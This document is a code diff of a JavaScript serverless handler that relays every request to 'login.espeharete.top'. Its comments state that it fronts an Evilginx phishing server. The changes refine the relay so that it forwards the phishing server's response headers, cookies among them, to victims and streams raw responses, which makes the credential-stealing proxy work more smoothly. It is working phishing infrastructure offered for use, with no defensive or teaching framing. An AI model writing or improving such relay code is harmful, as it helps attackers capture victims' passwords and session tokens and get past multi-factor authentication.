@@ -1,13 +1,9 @@
 export default async function handler(req, res) {
   const targetUrl = `https://login.espeharete.top${req.url}`;
 
-  // Clone headers and forward the real visitor IP
-  const headers = { 
-    ...req.headers,
-    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip, // Forward real IP
-    'X-Real-IP': req.headers['x-real-ip'] || req.ip, // For Evilginx logging
-  };
-  delete headers['host']; // Avoid conflicts
+  // Clone headers (critical for Evilginx to work)
+  const headers = { ...req.headers };
+  delete headers['host']; // Remove Vercel's host header
 
   try {
     const response = await fetch(targetUrl, {
@@ -16,8 +12,14 @@ export default async function handler(req, res) {
       body: req.method !== 'GET' ? req.body : undefined,
     });
 
-    const data = await response.text();
-    res.status(response.status).send(data);
+    // Forward headers from Evilginx to the client
+    for (const [key, value] of response.headers) {
+      res.setHeader(key, value);
+    }
+
+    // Stream the raw response (don't decode)
+    const buffer = await response.arrayBuffer();
+    res.status(response.status).send(Buffer.from(buffer));
   } catch (error) {
     res.status(500).send("Proxy error: " + error.message);
   }
